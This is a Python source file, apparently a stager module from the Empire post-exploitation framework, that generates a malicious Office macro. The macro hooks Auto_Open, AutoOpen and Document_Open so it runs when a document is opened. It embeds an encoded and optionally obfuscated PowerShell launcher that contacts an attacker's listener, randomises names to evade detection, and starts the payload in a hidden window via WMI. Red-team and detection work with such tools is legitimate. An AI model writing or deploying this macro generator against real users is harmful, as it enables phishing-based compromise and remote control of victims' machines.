from lib.common import helpers
import random, string

class Stager:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Macro',

            'Author': ['@enigma0x3', '@harmj0y'],

            'Description': ('Generates an office macro for Empire, compatible with office 97-2003, and 2007 file types.'),

            'Comments': [
                'http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/'
            ]
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener' : {
                'Description'   :   'Listener to generate stager for.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Language' : {
                'Description'   :   'Language of the stager to generate.',
                'Required'      :   True,
                'Value'         :   'powershell'
            },
            'StagerRetries' : {
                'Description'   :   'Times for the stager to retry connecting.',
                'Required'      :   False,
                'Value'         :   '0'
            },
            'OutFile' : {
                'Description'   :   'File to output macro to, otherwise displayed on the screen.',
                'Required'      :   False,
                'Value'         :   '/tmp/macro'
            },
            'Obfuscate' : {
                'Description'   :   'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required'      :   False,
                'Value'         :   'False'
            },
            'ObfuscateCommand' : {
                'Description'   :   'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required'      :   False,
                'Value'         :   r'Token\All\1,Launcher\STDIN++\12467'
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # extract all of our options
        language = self.options['Language']['Value']
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        obfuscate = self.options['Obfuscate']['Value']
        obfuscateCommand = self.options['ObfuscateCommand']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        stagerRetries = self.options['StagerRetries']['Value']

        obfuscateScript = False
        if obfuscate.lower() == "true":
            obfuscateScript = True

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=obfuscateScript, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
        Str = ''.join(random.choice(string.letters) for i in range(random.randint(1,len(listenerName))))
        Method=''.join(random.choice(string.letters) for i in range(random.randint(1,len(listenerName))))

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        else:
            chunks = list(helpers.chunks(launcher, 50))
            payload = "\tDim "+Str+" As String\n"
            payload += "\t"+Str+" = \"" + str(chunks[0]) + "\"\n"
            for chunk in chunks[1:]:
                payload += "\t"+Str+" = "+Str+" + \"" + str(chunk) + "\"\n"

            macro = "Sub Auto_Open()\n"
            macro += "\t"+Method+"\n"
            macro += "End Sub\n\n"
            macro += "Sub AutoOpen()\n"
            macro += "\t"+Method+"\n"
            macro += "End Sub\n\n"

            macro += "Sub Document_Open()\n"
            macro += "\t"+Method+"\n"
            macro += "End Sub\n\n"

            macro += "Public Function "+Method+"() As Variant\n"
            macro += payload
            macro += "\tConst HIDDEN_WINDOW = 0\n"
            macro += "\tstrComputer = \".\"\n"
            macro += "\tSet objWMIService = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2\")\n"
            macro += "\tSet objStartup = objWMIService.Get(\"Win32_ProcessStartup\")\n"
            macro += "\tSet objConfig = objStartup.SpawnInstance_\n"
            macro += "\tobjConfig.ShowWindow = HIDDEN_WINDOW\n"
            macro += "\tSet objProcess = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2:Win32_Process\")\n"
            macro += "\tobjProcess.Create "+Str+", Null, objConfig, intProcessID\n"
            macro += "End Function\n"

            return macro
